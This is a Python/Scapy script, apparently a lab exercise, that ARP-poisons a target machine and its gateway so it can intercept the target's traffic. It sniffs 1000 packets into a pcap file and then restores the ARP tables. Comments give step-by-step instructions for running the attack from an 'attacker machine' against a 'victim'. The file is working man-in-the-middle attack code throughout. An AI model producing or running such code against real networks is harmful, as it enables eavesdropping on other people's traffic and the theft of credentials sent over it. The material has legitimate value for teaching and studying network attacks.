from scapy.all import *
import os, sys, threading, signal

interface = "eth0"  # don't forget ifconfig
target_ip = "172.16.236.155"
gateway_ip = "172.16.236.2"  # route -n in linux
packet_count = 1000

'''
to run this script:
1) in victim vm - $ipconfig or $ifconfig
a) locate the default gateway and ipv4 address.
b) place that info in the script below.

run in attacker mach:
2) $ echo 1 > /proc/sys/net/ipv4/ip_forward # tells attacker machiene you it fwd packets (linux)
or mac:
$ sudo sysctl -w net.inet.ip.forwarding=1
3) $ sudo python2.7 arper.py
4) browse sites in victim machiene (or telnet)
5) quit the attacker script.
your attacker mach will have a file called arper.pcap
6) tcpdump -r arper.pcap
'''


# scoping issues abound
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method uding send
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):

    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    print "[*] ARP poison attack finished."
    return

# set our interface
conf.iface = interface

# turn off output
conf.verb = 0

print "[*] Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exciting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exciting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (target_ip, target_mac)

poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count
    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    # write out the captured packets
    wrpcap('arper.pcap', packets)

    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    # restore network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
